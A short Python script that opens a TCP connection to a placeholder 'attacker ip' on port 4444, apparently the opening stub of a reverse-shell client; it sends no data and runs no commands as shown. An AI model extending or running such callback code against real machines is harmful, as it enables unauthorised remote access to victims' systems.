import socket

host = "//insert here the attacker ip"
port = 4444
bufferSize = 8000


def client():
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection.connect((host, port))


if __name__ == "__main__":
    client()
